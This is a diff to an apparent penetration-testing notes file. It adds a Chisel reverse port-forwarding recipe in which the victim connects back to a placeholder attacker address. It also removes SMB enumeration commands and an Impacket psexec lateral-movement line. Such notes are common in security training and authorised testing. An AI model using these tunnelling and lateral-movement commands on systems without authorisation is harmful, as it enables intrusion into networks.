@@ -174,7 +174,12 @@ Post Exploitation
 Port Forwarding
 ----------------
 #Chisel
-- 
+
+	local system:
+	1. chisel server -p 8000 --reverse
+	
+	victim:
+	2. chisel client YOUR_IP:8000 R:1234:127.0.0.1:1234
 
 #Plink
 -
@@ -334,16 +339,6 @@ Show listening ports
 
 SMB - Enumeration
 ----------------
-- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
-- smbmap -H 10.10.10.10
-- smbclient -L 10.0.0.10
-- smbclient //10.10.10.10/share$
-
-SMB - Impacket
-----------------
-- Impacket's PSEXEC (After creating a remote port fwd)
-/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
-
 Password: (password)
 
 [*] Trying protocol 445/SMB...
